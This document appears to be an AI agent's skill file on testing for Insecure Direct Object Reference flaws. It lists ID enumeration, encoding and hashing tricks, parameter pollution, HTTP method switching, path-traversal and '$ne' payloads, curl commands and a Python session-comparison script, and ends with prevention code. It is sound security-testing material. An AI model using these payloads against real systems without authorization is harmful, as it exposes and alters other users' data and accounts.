---
name: idor
description: Insecure Direct Object Reference exploitation for authorization bypass. Use when testing access controls.
---

# Insecure Direct Object References (IDOR)

## Description
IDOR is an access control vulnerability where an application uses user-supplied input to directly access objects (files, database records, etc.) without proper authorization checks. This allows attackers to access resources belonging to other users.

## Common IDOR Locations

### URL Parameters
```
/user?id=123
/profile/123
/api/users/123
/download?file=report_123.pdf
/invoice/123/view
```

### POST Body Parameters
```json
{"user_id": 123, "action": "delete"}
{"order_id": "ORD-123", "status": "cancelled"}
```

### Headers
```http
X-User-ID: 123
Authorization: Bearer <token_containing_user_id>
```

### Cookies
```http
Cookie: user_id=123; session=abc
```

## Testing Methodology

### 1. Numeric ID Testing

```bash
# Increment/Decrement
/api/users/123  -> /api/users/124
/api/users/123  -> /api/users/122

# Try edge cases
/api/users/0
/api/users/1
/api/users/-1
/api/users/999999999
```

### 2. UUID/GUID Testing

```bash
# Version 1 UUIDs are time-based and predictable
# Format: xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx

# Try sequential generation
# If you have: 550e8400-e29b-11d4-a716-446655440000
# Try nearby timestamps

# Use tools to predict UUIDs
```

### 3. Encoded ID Testing

```bash
# Base64 encoded
/api/users/MTIz  # (123 in base64)
# Decode, modify, re-encode
echo -n "124" | base64  # MTI0

# Hex encoded
/api/users/7b  # (123 in hex)
# Convert: 7c = 124

# URL encoded
/api/users/%31%32%33  # (123 URL encoded)
```

### 4. Hashed ID Testing

```bash
# If ID is MD5/SHA1 hash
# Try hashing sequential values
echo -n "123" | md5sum  # 202cb962ac59075b964b07152d234b70
echo -n "124" | md5sum  # c8ffe9a587b126f152ed3d89a146b445

# Test with known hash values
```

### 5. Object ID Testing (MongoDB)

```bash
# MongoDB ObjectID: 507f1f77bcf86cd799439011
# Structure: timestamp(4) + machine(3) + pid(2) + counter(3)

# If you know the pattern, try adjacent ObjectIDs
# Use mongo-objectid-predict tool
```

## Advanced Techniques

### Parameter Pollution
```http
# Duplicate parameters
GET /api/user?id=123&id=456

# Array notation
GET /api/user?id[]=123&id[]=456
GET /api/user?id=123,456
```

### HTTP Method Switching
```bash
# If GET is protected, try POST
GET /api/users/123  # Forbidden
POST /api/users/123 # Success

# Try other methods
PUT, PATCH, DELETE, OPTIONS
```

### Content-Type Manipulation
```http
# Change content type
Content-Type: application/json    -> application/xml
Content-Type: application/json    -> application/x-www-form-urlencoded
```

### Adding Wrapper
```json
// Original
{"id": 123}

// With wrapper
{"user": {"id": 456}}
{"data": {"id": 456}}
```

### Wildcard Testing
```bash
# Try wildcards
/api/users/*
/api/users/%
/api/users/_
/api/users/.

# Array/Object access
/api/users?id[]=123&id[]=456
/api/users?id[$ne]=123
```

### Path Traversal + IDOR
```bash
/api/users/123/documents/../../../456/documents
/api/users/123/../456
```

## Common Vulnerable Endpoints

### User Management
```
GET /api/users/{id}
PUT /api/users/{id}
DELETE /api/users/{id}
GET /api/users/{id}/profile
GET /api/users/{id}/settings
```

### File Operations
```
GET /download?file={filename}
GET /files/{id}
GET /documents/{user_id}/{doc_id}
GET /uploads/{filename}
```

### Financial/Transactions
```
GET /api/orders/{id}
GET /api/invoices/{id}
GET /api/transactions/{id}
POST /api/refund/{order_id}
```

### Messages/Communications
```
GET /api/messages/{id}
GET /api/conversations/{id}
GET /api/emails/{id}
```

## Testing Tools

### Burp Suite Extensions

#### Autorize
```
1. Install from BApp Store
2. Configure low-privilege session cookies
3. Browse as high-privilege user
4. Autorize replays requests with low-privilege cookies
5. Compare responses
```

#### AuthMatrix
```
1. Define user roles
2. Configure session tokens for each role
3. Run tests across all endpoints
4. Identify authorization failures
```

### Manual Testing
```bash
# Using curl with different sessions
curl -H "Cookie: session=user1_session" https://target.com/api/data/1
curl -H "Cookie: session=user2_session" https://target.com/api/data/1

# Compare responses
```

## Automated Testing Script
```python
import requests

base_url = "https://target.com/api/users"
session_user1 = {"Cookie": "session=abc123"}
session_user2 = {"Cookie": "session=xyz789"}

# Get user1's data with both sessions
user1_id = 123

# User1 accessing own data
r1 = requests.get(f"{base_url}/{user1_id}", headers=session_user1)

# User2 accessing user1's data (IDOR test)
r2 = requests.get(f"{base_url}/{user1_id}", headers=session_user2)

if r1.status_code == 200 and r2.status_code == 200:
    if r1.text == r2.text:
        print(f"[VULNERABLE] IDOR found at {base_url}/{user1_id}")
```

## Impact Examples

### Data Disclosure
```
- View other users' personal information
- Access private documents
- Read confidential messages
```

### Data Modification
```
- Change other users' profiles
- Modify order details
- Update account settings
```

### Privilege Escalation
```
- Access admin functionality
- View admin-only resources
- Perform admin actions
```

### Account Takeover
```
- Change other users' passwords
- Modify email addresses
- Access password reset tokens
```

## Prevention

```python
# Always verify ownership
def get_document(request, doc_id):
    document = Document.objects.get(id=doc_id)

    # Check if requesting user owns the document
    if document.owner_id != request.user.id:
        return HttpResponseForbidden()

    return document

# Use indirect references
def get_user_document(request, doc_index):
    # Map index to actual ID for this user
    user_docs = request.user.documents.all()
    if doc_index >= len(user_docs):
        return HttpResponseNotFound()
    return user_docs[doc_index]
```

## Testing Checklist

- [ ] Map all endpoints with object references
- [ ] Identify the reference format (numeric, UUID, encoded)
- [ ] Test horizontal privilege escalation (same role, different user)
- [ ] Test vertical privilege escalation (lower to higher privilege)
- [ ] Test with different HTTP methods
- [ ] Test parameter pollution
- [ ] Test encoded/hashed references
- [ ] Use Autorize/AuthMatrix for systematic testing

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
- https://portswigger.net/web-security/access-control/idor
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
